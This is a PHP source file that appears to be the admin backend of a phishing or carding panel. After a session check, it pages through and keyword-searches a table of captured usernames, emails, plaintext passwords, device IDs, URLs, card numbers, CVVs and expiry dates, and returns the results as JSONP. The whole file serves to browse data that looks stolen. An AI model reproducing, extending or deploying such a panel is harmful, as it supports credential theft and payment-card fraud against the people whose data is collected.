<?php
	require_once("connect.php");
	require_once("lib.php");

	$page_size = (isset($_REQUEST["page_size"]) && ($_REQUEST["page_size"] !== "")) ? (int) $_REQUEST["page_size"] : NULL;
	$page_number = (isset($_REQUEST["page_number"]) && ($_REQUEST["page_number"] !== "")) ? (int) $_REQUEST["page_number"] : NULL;
	$session = (isset($_REQUEST["s"]) && ($_REQUEST["s"] !== "")) ? (string) $_REQUEST["s"] : NULL;
	$keyword = (isset($_REQUEST["k"]) && ($_REQUEST["k"] !== "")) ? (string) "%" . $_REQUEST["k"] . "%" : NULL;

	$debug = false;
	$respond = [];
	$respond["status"] = "success";

	if (is_null($session)) {
		$respond["status"] = "failure";
		$respond["msg"] = "error";
	} else {
		if (is_null($page_size)) {
			$page_size = 10;
		}

		if (is_null($page_number)) {
			$page_number = 1;
		}

		$db = db_connect();
		if (!$db) {
			$respond["status"] = "failure";
			$respond["msg"] = "System down";
		} else {
			if (!verify_session($db, $session)) {
				$respond["status"] = "failure";
				$respond["msg"] = "error";
			} else {
				if (is_null($keyword)) {
					if (($query = $db->query("select count(*) as total from shit")) === false) {
						$respond["status"] = "failure";
						$respond["msg"] = ($debug ? "normal sql query failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
					} else {
						if (($result = $query->fetch(PDO::FETCH_ASSOC)) === false) {
							$respond["status"] = "failure";
							$respond["msg"] = ($debug ? "normal sql fetch failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
						} else {
							$total = (int) $result["total"];
				    	}
					}
				} else {
					$select_total_stmt =  $db->prepare("select count(*) as total from shit where (
						username like :username or email like :email or password like :password or
						browser_agent like :browser_agent or device_id like :device_id or url like :url or
						cd_number like :cd_number or cd_cvv like :cd_cvv or cd_valid_date like :cd_valid_date
						)"
					);

					if (!$select_total_stmt) {
						$respond["status"] = "failure";
						$respond["msg"] = ($debug ? "select_total_stmt prepare failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
					} else {
						$select_1 = $select_total_stmt->bindParam(":username", $keyword, PDO::PARAM_STR);
						$select_2 = $select_total_stmt->bindParam(":email", $keyword, PDO::PARAM_STR);
						$select_3 = $select_total_stmt->bindParam(":password", $keyword, PDO::PARAM_STR);
						$select_4 = $select_total_stmt->bindParam(":browser_agent", $keyword, PDO::PARAM_STR);
						$select_5 = $select_total_stmt->bindParam(":device_id", $keyword, PDO::PARAM_STR);
						$select_6 = $select_total_stmt->bindParam(":url", $keyword, PDO::PARAM_STR);
						$select_7 = $select_total_stmt->bindParam(":cd_number", $keyword, PDO::PARAM_STR);
						$select_8 = $select_total_stmt->bindParam(":cd_cvv", $keyword, PDO::PARAM_STR);
						$select_9 = $select_total_stmt->bindParam(":cd_valid_date", $keyword, PDO::PARAM_STR);

						if (!$select_1 || !$select_2 || !$select_3 || !$select_4 || !$select_5 || !$select_6 ||
							!$select_7 || !$select_8 || !$select_9) {
							$respond["status"] = "failure";
							$respond["msg"] = ($debug ? "select_total_stmt bind failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
						} else {
							if (!$select_total_stmt->execute()) {
								$respond["status"] = "failure";
								$respond["msg"] = ($debug ? "select_total_stmt execute failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
							} else {
								if (($total = $select_total_stmt->fetchColumn()) === false) {
									$respond["status"] = "failure";
									$respond["msg"] = ($debug ? "select_total_stmt fetchAll failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
								}
							}
						}
					}
				}

				if ($respond["status"] == "success") {
					$number_of_pages = ceil($total / $page_size);
				    $start = ($page_number - 1) * $page_size;
				}

				if ($respond["status"] == "success") {
					if (is_null($keyword)) {
						$select_stmt =  $db->prepare("select id, username, email, password, browser_agent, device_id, create_date from shit limit :start, :page_size");
						if (!$select_stmt) {
							$respond["status"] = "failure";
							$respond["msg"] = ($debug ? "select_stmt prepare failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
						} else {
							$select_1 = $select_stmt->bindParam(":start", $start, PDO::PARAM_INT);
							$select_2 = $select_stmt->bindParam(":page_size", $page_size, PDO::PARAM_INT);
							if (!$select_1 || !$select_2) {
								$respond["status"] = "failure";
								$respond["msg"] = ($debug ? "select_stmt bind failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
							} else {
								if (!$select_stmt->execute()) {
									$respond["status"] = "failure";
									$respond["msg"] = ($debug ? "select_stmt execute failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
								} else {
									if (($result = $select_stmt->fetchAll(PDO::FETCH_ASSOC)) === false) {
										$respond["status"] = "failure";
										$respond["msg"] = ($debug ? "select_stmt fetchAll failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
									} else {
										$respond["pager"]["total"] = $total;
										$respond["pager"]["number_of_pages"] = $number_of_pages;
										$respond["content"] = $result;
									}
								}
							}
						}
					} else {
						$select_stmt =  $db->prepare("select id, username, email, password, browser_agent, device_id, create_date from shit
							where (
								username like :username or email like :email or password like :password or
								browser_agent like :browser_agent or device_id like :device_id or url like :url or
								cd_number like :cd_number or cd_cvv like :cd_cvv or cd_valid_date like :cd_valid_date
							) limit :start, :page_size");
						if (!$select_stmt) {
							$respond["status"] = "failure";
							$respond["msg"] = ($debug ? "select_stmt prepare failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
						} else {
							$select_1 = $select_stmt->bindParam(":username", $keyword, PDO::PARAM_STR);
							$select_2 = $select_stmt->bindParam(":email", $keyword, PDO::PARAM_STR);
							$select_3 = $select_stmt->bindParam(":password", $keyword, PDO::PARAM_STR);
							$select_4 = $select_stmt->bindParam(":browser_agent", $keyword, PDO::PARAM_STR);
							$select_5 = $select_stmt->bindParam(":device_id", $keyword, PDO::PARAM_STR);
							$select_6 = $select_stmt->bindParam(":url", $keyword, PDO::PARAM_STR);
							$select_7 = $select_stmt->bindParam(":cd_number", $keyword, PDO::PARAM_STR);
							$select_8 = $select_stmt->bindParam(":cd_cvv", $keyword, PDO::PARAM_STR);
							$select_9 = $select_stmt->bindParam(":cd_valid_date", $keyword, PDO::PARAM_STR);
							$select_10 = $select_stmt->bindParam(":start", $start, PDO::PARAM_INT);
							$select_11 = $select_stmt->bindParam(":page_size", $page_size, PDO::PARAM_INT);

							if (!$select_1 || !$select_2 || !$select_3 || !$select_4 || !$select_5 || !$select_6 ||
								!$select_7 || !$select_8 || !$select_9 || !$select_10 || !$select_11) {
								$respond["status"] = "failure";
								$respond["msg"] = ($debug ? "select_stmt bind failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
							} else {
								if (!$select_stmt->execute()) {
									$respond["status"] = "failure";
									$respond["msg"] = ($debug ? "select_stmt execute failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
								} else {
									if (($result = $select_stmt->fetchAll(PDO::FETCH_ASSOC)) === false) {
										$respond["status"] = "failure";
										$respond["msg"] = ($debug ? "select_stmt fetchAll failed: (" . $db->errorCode() . ") " . implode(",", $db->errorInfo()) : "error");
									} else {
										$respond["pager"]["total"] = $total;
										$respond["pager"]["number_of_pages"] = $number_of_pages;
										$respond["content"] = $result;
									}
								}
							}
						}
					}
				}
			}
		}
	}
	echo "ap(" . json_encode($respond) . ")";
?>
